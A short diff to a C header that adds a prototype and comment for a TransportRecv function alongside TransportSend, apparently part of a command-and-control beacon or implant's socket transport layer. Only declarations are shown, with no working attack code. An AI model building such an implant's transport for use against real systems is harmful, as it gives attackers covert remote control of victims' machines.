@@ -43,3 +43,15 @@ DEFINESEC(B) VOID TransportFree( PBEACON_INSTANCE Ins );
  *
 -*/
 DEFINESEC(B) BOOL TransportSend( PBEACON_INSTANCE Ins, PVOID Data, ULONG Size );
+
+/*-
+ *
+ * TransportRecv
+ *
+ * Purpose:
+ *
+ * Recv's data over the connected socket.
+ * Sets the length recieved in the buffer
+ *
+-*/
+DEFINESEC(B) BOOL TransportRecv( PBEACON_INSTANCE Ins, PVOID* Data, ULONG* Size );
